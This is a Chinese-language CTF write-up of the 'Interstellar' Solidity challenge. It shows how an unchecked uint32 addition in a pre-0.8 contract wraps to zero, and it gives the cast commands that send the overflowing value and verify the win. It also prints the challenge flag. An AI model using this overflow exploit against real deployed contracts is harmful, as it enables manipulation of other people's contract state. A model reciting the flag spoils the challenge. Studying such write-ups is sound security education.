# Interstellar

## 题目简述

`SpaceShip` 使用 Solidity `0.7.0`，以 `uint32` 保存 `distanceTraveled`，初值为 `1337`；`Setup.isSolved()` 要求该值变成 `0`。`galacticBoost(uint32)` 在加法后检查结果小于 `2^{32}-1`，但 Solidity 0.8 之前的整数运算不会自动检查溢出，因此可以让加法按模 $2^{32}$ 回绕。

## 解题过程

`uint32` 的模数为 $2^{32}$。要把初值 `1337` 加到 `0`，参数应满足：

$$
1337+x\equiv 0\pmod{2^{32}}.
$$

因此：

$$
x=2^{32}-1337=4294965959.
$$

先从 `Setup` 读取目标合约地址：

```bash
TARGET=$(cast call "$SETUP" "TARGET()(address)" --rpc-url "$RPC")
```

向目标调用 `galacticBoost(uint32)`：

```bash
cast send "$TARGET" "galacticBoost(uint32)" 4294965959 \
  --rpc-url "$RPC" \
  --private-key "$PLAYER_PRIVATE_KEY"
```

表达式 `distanceTraveled + advanceWithDistance` 先在 `uint32` 上回绕为 `0`，所以 `0 < 4294967295`，错误的防溢出检查反而放行。状态更新同样写入 `0`。验证命令为：

```bash
cast call "$TARGET" "getDistanceTraveled()(uint256)" --rpc-url "$RPC"
cast call "$SETUP" "isSolved()(bool)" --rpc-url "$RPC"
```

官方解法给出的 flag 为：

```text
shellmates{1nt3g3R_0v3rfl0o0W_1s_4_Bl0o0o0cKk_H0o0l3}
```

## 方法总结

- 核心技巧：利用 Solidity 0.8 以前无检查整数运算的模回绕，把 `uint32` 状态精确变为零。
- 识别信号：旧版 Solidity、窄整数类型和“先运算再比较”的手工防溢出条件同时出现时，应直接计算模数关系。
- 复用要点：检查必须发生在不会先溢出的表达式上；旧编译器应使用 SafeMath，现代 Solidity 则默认检查溢出，只有 `unchecked` 会恢复回绕语义。
